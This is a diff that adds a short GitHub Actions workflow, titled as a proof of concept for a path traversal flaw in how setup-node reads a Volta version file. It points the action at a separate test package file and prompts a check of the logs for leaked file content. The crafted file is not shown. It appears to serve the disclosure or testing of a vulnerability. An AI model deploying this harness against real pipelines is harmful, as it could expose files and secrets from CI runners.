@@ -1,0 +1,15 @@
+name: Volta Path Traversal PoC
+on:
+  workflow_dispatch:
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version-file: volta-test-package.json
+        continue-on-error: true
+      - name: Check what was logged
+        if: always()
+        run: echo "Check workflow logs for leaked file content"
